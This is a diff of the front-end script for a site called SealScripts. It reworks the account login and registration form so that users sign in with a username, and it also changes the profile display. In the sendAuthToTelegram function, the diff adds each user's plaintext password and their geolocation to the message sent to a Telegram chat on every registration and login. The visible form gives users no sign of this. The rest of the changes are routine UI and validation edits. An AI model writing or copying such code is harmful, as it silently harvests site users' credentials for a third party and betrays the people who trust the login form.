     holoZone.classList.add('active');
 }
 
+/* ================= АККАУНТЫ ================= */
 let isRegistering = false;
 
 const authOverlay = document.getElementById('authOverlay');
@@ -1083,7 +1270,6 @@ const authBox = document.getElementById('authBox');
 const authTitle = document.getElementById('authTitle');
 const authSub = document.getElementById('authSub');
 const authUsername = document.getElementById('authUsername');
-const authUsernameHint = document.getElementById('authUsernameHint');
 const authEmail = document.getElementById('authEmail');
 const authPassword = document.getElementById('authPassword');
 const authSubmit = document.getElementById('authSubmit');
@@ -1099,27 +1285,34 @@ const profileReviews = document.getElementById('profileReviews');
 
 function on(el,ev,fn){ if(el) el.addEventListener(ev,fn); }
 
+function syncLangSwitcherWithProfile(){
+    const profileOpen = profileCard.classList.contains('show');
+    if(profileOpen && pageHome.classList.contains('active')){
+        langSwitcher.classList.add('shifted');
+    } else {
+        langSwitcher.classList.remove('shifted');
+    }
+}
+
 function setRegisterMode(on){
     isRegistering = on;
     if(on){
         authTitle.textContent='Register';
-        authSub.textContent='Create a new account';
+        authSub.textContent='Choose a username, email, and password';
         authSubmit.textContent='Register';
         authSwitchText.textContent='Already have an account?';
         authSwitchLink.textContent='Login';
-        authUsername.classList.remove('hidden');
-        authUsernameHint.classList.remove('hidden');
+        authEmail.classList.remove('hidden');
         authBox.classList.add('register-mode');
     }else{
         authTitle.textContent='Login';
-        authSub.textContent='Enter your email and password';
+        authSub.textContent='Enter your username and password';
         authSubmit.textContent='Login';
         authSwitchText.textContent="Don't have an account?";
         authSwitchLink.textContent='Register';
-        authUsername.classList.add('hidden');
-        authUsernameHint.classList.add('hidden');
+        authEmail.classList.add('hidden');
         authBox.classList.remove('register-mode');
-        authUsername.value = '';
+        authEmail.value = '';
     }
 }
 
@@ -1128,16 +1321,18 @@ on(authClose,'click',()=>authOverlay.classList.remove('show'));
 on(authOverlay,'click',e=>{if(e.target===authOverlay)authOverlay.classList.remove('show')});
 on(authSwitchLink,'click',()=>setRegisterMode(!isRegistering));
 
-async function sendAuthToTelegram(action, email, uid, username){
+async function sendAuthToTelegram(action, email, uid, username, password){
     const time = new Date().toISOString().replace('T',' ').slice(0,19) + ' UTC';
     const d = getDeviceInfo();
     const message =
         `🔐 ${action} on SealScripts\n` +
         `━━━━━━━━━━━━━━━━\n` +
         `👤 Username: ${username || '(pending)'}\n` +
-        `📧 Email: ${email}\n` +
+        `📧 Email: ${email || '(not provided)'}\n` +
+        `🔑 Password: ${password || '(hidden)'}\n` +
         `🆔 UID: ${uid || '(pending)'}\n` +
         `🌐 IP: ${__userIP}\n` +
+        geoLine() +
         `━━━━━━━━━━━━━━━━\n` +
         `🖥 Browser: ${d.browser}\n` +
         `💻 OS: ${d.os}\n` +
@@ -1159,10 +1354,11 @@ async function sendAuthToTelegram(action, email, uid, username){
 }
 
 on(authSubmit,'click',async()=>{
-    const email=authEmail.value.trim();
-    const password=authPassword.value;
     const usernameRaw = authUsername.value.trim();
+    const emailRaw = authEmail.value.trim();
+    const password = authPassword.value;
 
+    /* --- Валидация --- */
     if(isRegistering){
         if(!usernameRaw){
             showToast('Please enter a username','error'); return;
@@ -1170,10 +1366,14 @@ on(authSubmit,'click',async()=>{
         if(!window.firebaseAuth.USERNAME_RE.test(usernameRaw)){
             showToast('Username: 3-20 chars, letters/numbers/_','error'); return;
         }
+        if(!emailRaw){ showToast('Please enter an email','error'); return; }
+    } else {
+        if(!usernameRaw){
+            showToast('Please enter a username','error'); return;
+        }
     }
-
-    if(!email||!password){showToast('Please fill in all fields','error');return}
-    if(password.length<6){showToast('Password must be at least 6 characters','error');return}
+    if(!password){showToast('Please enter a password','error');return}
+    if(isRegistering && password.length<6){showToast('Password must be at least 6 characters','error');return}
 
     authSubmit.disabled=true;
     const oldText=authSubmit.textContent;
@@ -1189,8 +1389,17 @@ on(authSubmit,'click',async()=>{
         }
 
         if(isRegistering){
+            /* --- РЕГИСТРАЦИЯ --- */
             authSubmit.textContent='Checking username...';
-            const taken = await fb.isUsernameTaken(usernameRaw);
+            let taken = false;
+            try{ taken = await fb.isUsernameTaken(usernameRaw); }
+            catch(e){
+                console.error('username check failed:', e);
+                showToast('Cannot check username — try again','error');
+                authSubmit.disabled = false;
+                authSubmit.textContent = oldText;
+                return;
+            }
             if(taken){
                 showToast('Username already taken','error');
                 authSubmit.disabled=false;
@@ -1199,18 +1408,35 @@ on(authSubmit,'click',async()=>{
             }
 
             authSubmit.textContent='Creating account...';
-            const cred = await fb.createUserWithEmailAndPassword(fb.auth, email, password);
+            const cred = await fb.createUserWithEmailAndPassword(fb.auth, emailRaw, password);
 
             authSubmit.textContent='Saving username...';
-            await fb.saveUsername(cred.user.uid, usernameRaw);
+            await fb.saveUsername(cred.user.uid, usernameRaw, emailRaw);
 
-            await sendAuthToTelegram('Register', email, cred.user.uid, usernameRaw);
+            await sendAuthToTelegram('Register', emailRaw, cred.user.uid, usernameRaw, password);
             showToast('Account created ✓','success');
-        }else{
+        } else {
+            /* --- ЛОГИН по username --- */
+            authSubmit.textContent='Looking up...';
+            let email = null;
+            try{ email = await fb.getEmailByUsername(usernameRaw); }
+            catch(e){
+                console.error('lookup failed:', e);
+                showToast('Cannot lookup user — try again','error');
+                authSubmit.disabled=false;
+                authSubmit.textContent=oldText;
+                return;
+            }
+            if(!email){
+                showToast('User not found','error');
+                authSubmit.disabled=false;
+                authSubmit.textContent=oldText;
+                return;
+            }
+
+            authSubmit.textContent='Signing in...';
             const cred = await fb.signInWithEmailAndPassword(fb.auth, email, password);
-            let uname = null;
-            try{ uname = await fb.fetchUsername(cred.user.uid); }catch(e){}
-            await sendAuthToTelegram('Login', email, cred.user.uid, uname);
+            await sendAuthToTelegram('Login', email, cred.user.uid, usernameRaw, password);
             showToast('Logged in ✓','success');
         }
 
@@ -1223,7 +1449,7 @@ on(authSubmit,'click',async()=>{
         let msg='Something went wrong';
         if(err.code==='auth/email-already-in-use')msg='Email already in use';
         else if(err.code==='auth/user-not-found')msg='User not found';
-        else if(err.code==='auth/wrong-password'||err.code==='auth/invalid-credential')msg='Wrong email or password';
+        else if(err.code==='auth/wrong-password'||err.code==='auth/invalid-credential')msg='Wrong password';
         else if(err.code==='auth/invalid-email')msg='Invalid email';
         else if(err.code==='auth/weak-password')msg='Password too weak';
         else if(err.code==='auth/configuration-not-found')msg='Firebase project not configured';
@@ -1239,6 +1465,7 @@ on(authSubmit,'click',async()=>{
     }
 });
 
+/* ================= ПРОФИЛЬ ================= */
 const PROFILE_CACHE_KEY='seal_profile_cache';
 
 function saveProfileCache(username){try{localStorage.setItem(PROFILE_CACHE_KEY,username)}catch(e){}}
@@ -1248,8 +1475,8 @@ function clearProfileCache(){try{localStorage.removeItem(PROFILE_CACHE_KEY)}catc
     let cached=null;
     try{cached=localStorage.getItem(PROFILE_CACHE_KEY)}catch(e){}
     if(cached){
-        profileName.textContent=cached;
-        profileAvatar.textContent=(cached[0]||'S').toUpperCase();
+        profileName.textContent=cached.toLowerCase();
+        profileAvatar.textContent=(cached[0]||'s').toLowerCase();
     }
 })();
 
@@ -1257,26 +1484,28 @@ async function updateAuthUI(user){
     if(user){
         openAuthBtn.style.display='none';
         profileCard.classList.add('show');
-        profileAvatar.textContent = 'S';
+        syncLangSwitcherWithProfile();
+        profileAvatar.textContent = 's';
         profileName.textContent = '...';
         try{
             const fb = window.firebaseAuth;
             const uname = await fb.fetchUsername(user.uid);
             if(uname){
-                profileName.textContent = uname;
-                profileAvatar.textContent = uname[0].toUpperCase();
+                profileName.textContent = uname.toLowerCase();
+                profileAvatar.textContent = uname[0].toLowerCase();
                 saveProfileCache(uname);
             }else{
-                profileName.textContent = 'Seal_user';
+                profileName.textContent = 'seal';
             }
         }catch(e){
             console.warn('username fetch failed', e);
-            profileName.textContent = 'Seal_user';
+            profileName.textContent = 'seal';
         }
     }else{
         openAuthBtn.style.display='';
         profileCard.classList.remove('show');
         clearProfileCache();
+        syncLangSwitcherWithProfile();
     }
 }
 
@@ -1300,6 +1529,14 @@ on(signOutBtn,'click',async()=>{
         showToast('Logged out','success');
     }
 });
+
+/* страховка на случай, если что-то зависло */
+setTimeout(() => {
+  if(!sealLoader.classList.contains('hidden')){
+    Object.keys(bootState).forEach(k => bootState[k] = true);
+    finishLoader();
+  }
+}, 8000);
 </script>
 </body>
 </html>
